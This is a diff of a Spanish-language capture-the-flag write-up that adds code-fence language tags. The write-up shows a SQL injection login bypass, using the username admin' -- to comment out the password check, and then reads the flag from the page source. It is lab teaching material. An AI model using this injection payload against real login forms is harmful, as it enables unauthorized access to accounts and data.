@@ -8,7 +8,7 @@ Al entrar a la página que nos dan, vemos esta pantalla de login
 ![[08SQLiLite.png]]
 
 Al loguearnos con un username y contraseña genéricos como admin y '123', obtenemos este texto de error, que también nos da una idea de la sentencia sql que se hace para consultar las credenciales
-```
+```sqlite
 username: admin
 password: 123
 SQL query: SELECT * FROM users WHERE name='admin' AND password='123'
@@ -17,7 +17,7 @@ SQL query: SELECT * FROM users WHERE name='admin' AND password='123'
 ```
 
 Ahora lo que haremos es alterar las credenciales que insertaremos para modificar esa sentencia, de tal forma que quede así, así que admin pasa a ser '**admin' --** '
-```
+```sqlite
 SELECT * FROM users WHERE name='admin' -- ' AND password=''
 ```
 
@@ -31,7 +31,7 @@ SQL query: SELECT * FROM users WHERE name='admin'--' AND password=''
 ```
 
 Como casi siempre, nuestra flag está en el código fuente de la página
-```
+```html
 <pre>username: admin&#039;--
 password: 
 SQL query: SELECT * FROM users WHERE name=&#039;admin&#039;--&#039; AND password=&#039;&#039;
